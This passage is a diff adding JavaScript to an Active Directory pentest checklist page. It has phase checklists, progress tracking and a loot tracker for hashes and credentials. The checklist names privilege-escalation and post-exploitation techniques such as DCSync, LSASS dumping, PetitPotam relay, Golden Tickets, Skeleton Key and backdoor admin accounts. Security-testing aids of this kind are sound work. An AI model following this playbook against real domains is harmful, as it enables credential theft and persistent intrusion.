+    'Token impersonation if SeImpersonatePrivilege (potato attacks)',
+  ]},
+  {id:'p5',label:'Phase 5 — Privilege Escalation → DA',color:'#d29922',jump:{have:['have-foothold'],cat:['cat-privesc','cat-adcs','cat-delegation']},items:[
+    'SeImpersonatePrivilege → GodPotato / PrintSpoofer → SYSTEM',
+    'SeBackupPrivilege → reg save SAM+SYSTEM → secretsdump LOCAL',
+    'SeDebugPrivilege → LSASS dump → extract creds / hashes',
+    'WriteDACL on domain → Add-ObjectACL → grant self DCSync rights',
+    'Account Operators → Exchange Windows Permissions → WriteDACL → DCSync',
+    'BloodHound — Kerberoastable users with path to Domain Admins',
+    'ADCS — certipy find → ESC1 / ESC4 / ESC8 (relay + cert)',
+    'Coercion → ESC8 — PetitPotam + ntlmrelayx --adcs → cert for DC → DCSync',
+    'Unconstrained delegation + coercion (PrinterBug/PetitPotam) → steal DC TGT',
+    'Constrained delegation S4U2Proxy → request TGS as Domain Admin',
+    'RBCD — GenericWrite on computer → configure delegation → S4U2Self',
+    'DNSAdmins — inject malicious DLL via DNS service restart (→ SYSTEM on DC)',
+    'CVE: noPac / Zerologon / PrintNightmare — check patch level first',
+  ]},
+  {id:'p6',label:'Phase 6 — Domain Admin / Post-Exploitation',color:'#2ea043',jump:{have:['have-domainadmin'],cat:['cat-dump','cat-persist']},items:[
+    'DCSync — impacket-secretsdump → dump all domain hashes',
+    'Dump NTDS.dit — diskshadow / vssadmin / wbadmin (physical copy)',
+    'CME --sam across domain — dump all local SAM hives',
+    'Golden Ticket — forge TGT with krbtgt hash (10-year persistence)',
+    'Create backdoor Domain Admin account',
+    'Cross-domain / cross-forest trust attacks — SID History, trust tickets',
+    'Persistence — DSRM password, Skeleton Key, WMI subscription, GPO abuse',
+    'Custom SSP (mimilib) — capture all future logins in plaintext',
+    'Document all findings, paths, and commands run with timestamps',
+  ]},
+];
+
+// ── Render flow phases ────────────────────────────────────────────────────────
+function renderFlow(){
+  const fp = document.getElementById('flow-phases');
+  fp.innerHTML = FLOW.map(phase=>{
+    const itemsHtml = phase.items.map((item,i)=>`
+      <div class="ph-item" data-phase="${phase.id}" data-idx="${i}" onclick="toggleCheck(this)">
+        <div class="pi-box">&#10003;</div>
+        <span class="pi-txt">${item}</span>
+      </div>`).join('');
+    const jh = phase.jump.have.map(v=>`'${v}'`).join(',');
+    const jc = phase.jump.cat.map(v=>`'${v}'`).join(',');
+    return `<div class="ph-card" id="phcard-${phase.id}">
+      <div class="ph-hdr" onclick="togglePhase('${phase.id}')">
+        <div class="ph-dot" style="background:${phase.color}"></div>
+        <span class="ph-title">${phase.label}</span>
+        <span class="ph-prog" id="prog-${phase.id}">0 / ${phase.items.length}</span>
+        <button class="ph-jump" onclick="event.stopPropagation();jumpFilter([${jh}],[${jc}])">Filter &rarr;</button>
+        <span class="ph-chev">&#9660;</span>
+      </div>
+      <div class="ph-body">${itemsHtml}</div>
+    </div>`;
+  }).join('');
+  loadChecks();
+}
+
+function togglePhase(id){
+  document.getElementById('phcard-'+id).classList.toggle('open');
+}
+
+function toggleCheck(el){
+  el.classList.toggle('done');
+  const key = 'ck_'+el.dataset.phase+'_'+el.dataset.idx;
+  el.classList.contains('done') ? localStorage.setItem(key,'1') : localStorage.removeItem(key);
+  updateProgress(el.dataset.phase);
+}
+
+function updateProgress(phaseId){
+  const phase = FLOW.find(p=>p.id===phaseId);
+  if(!phase) return;
+  const done = phase.items.filter((_,i)=>localStorage.getItem('ck_'+phaseId+'_'+i)==='1').length;
+  const el = document.getElementById('prog-'+phaseId);
+  if(!el) return;
+  el.textContent = done+' / '+phase.items.length;
+  el.style.color = done===phase.items.length ? 'var(--green)' : 'var(--text2)';
+}
+
+function loadChecks(){
+  FLOW.forEach(phase=>{
+    phase.items.forEach((_,i)=>{
+      if(localStorage.getItem('ck_'+phase.id+'_'+i)==='1'){
+        const el = document.querySelector(`.ph-item[data-phase="${phase.id}"][data-idx="${i}"]`);
+        if(el) el.classList.add('done');
+      }
+    });
+    updateProgress(phase.id);
+  });
+}
+
+function jumpFilter(haveTags, catTags){
+  document.querySelectorAll('.vtab').forEach(b=>b.classList.remove('active'));
+  document.querySelector('.vtab[data-view="cards"]').classList.add('active');
+  document.getElementById('cards-section').style.display = '';
+  document.getElementById('flow-view').style.display = 'none';
+  document.querySelectorAll('.fb.on').forEach(b=>b.classList.remove('on'));
+  [...haveTags,...catTags].forEach(v=>{
+    const btn = document.querySelector(`.fb[data-v="${v}"]`);
+    if(btn) btn.classList.add('on');
+  });
+  applyFilters();
+  window.scrollTo(0,0);
+}
+
+document.getElementById('flow-reset-btn').addEventListener('click',()=>{
+  if(!confirm('Reset all phase checkboxes?')) return;
+  FLOW.forEach(phase=>{
+    phase.items.forEach((_,i)=>localStorage.removeItem('ck_'+phase.id+'_'+i));
+  });
+  document.querySelectorAll('.ph-item.done').forEach(el=>el.classList.remove('done'));
+  FLOW.forEach(p=>updateProgress(p.id));
+});
+
+// ── Loot tracker ─────────────────────────────────────────────────────────────
+const LOOT_IDS = ['l-dcip','l-domain','l-dchost','l-ca','l-exch','l-other','l-users','l-creds','l-hashes','l-notes'];
+
+function saveLoot(){ LOOT_IDS.forEach(id=>{ const el=document.getElementById(id); if(el) localStorage.setItem(id,el.value); }); }
+
+function loadLoot(){
+  LOOT_IDS.forEach(id=>{ const el=document.getElementById(id); if(el && localStorage.getItem(id)!==null) el.value=localStorage.getItem(id); });
+  const acc = localStorage.getItem('loot-access');
+  if(acc) document.querySelectorAll('.alevbtn').forEach(b=>{ if(b.dataset.v===acc) b.classList.add('on'); });
+}
+
+LOOT_IDS.forEach(id=>{ const el=document.getElementById(id); if(el) el.addEventListener('input',saveLoot); });
+
+document.querySelectorAll('.alevbtn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.alevbtn').forEach(b=>b.classList.remove('on'));
+    btn.classList.add('on');
+    localStorage.setItem('loot-access', btn.dataset.v);
+  });
+});
+
+document.getElementById('loot-clear-btn').addEventListener('click',()=>{
+  if(!confirm('Clear all loot tracker data and notes?')) return;
+  LOOT_IDS.forEach(id=>{ const el=document.getElementById(id); if(el){ el.value=''; localStorage.removeItem(id); } });
+  localStorage.removeItem('loot-access');
+  document.querySelectorAll('.alevbtn').forEach(b=>b.classList.remove('on'));
+});
+
+document.getElementById('loot-copy-btn').addEventListener('click',()=>{
+  const f = id => document.getElementById(id)?.value?.trim() || '—';
+  const acc = document.querySelector('.alevbtn.on')?.textContent?.trim() || '—';
+  const out = [
+    '=== AD Pentest — Loot Summary ===',
+    'DC IP:        '+f('l-dcip'),
+    'Domain:       '+f('l-domain'),
+    'DC Hostname:  '+f('l-dchost'),
+    'CA Server:    '+f('l-ca'),
+    'Exchange:     '+f('l-exch'),
+    'Other:        '+f('l-other'),
+    'Access Level: '+acc,
+    '',
+    '--- Users Found ---',     f('l-users'),
+    '',
+    '--- Credentials ---',     f('l-creds'),
+    '',
+    '--- NT Hashes ---',       f('l-hashes'),
+    '',
+    '--- Notes ---',           f('l-notes'),
+  ].join('\n');
+  navigator.clipboard.writeText(out).then(()=>{
+    const btn=document.getElementById('loot-copy-btn');
+    btn.textContent='Copied!';
+    setTimeout(()=>{ btn.innerHTML='&#128203; Copy Summary'; },2000);
+  });
+});
+
+// ── Init flow ─────────────────────────────────────────────────────────────────
+renderFlow();
+loadLoot();
+</script>
+</body>
+</html>
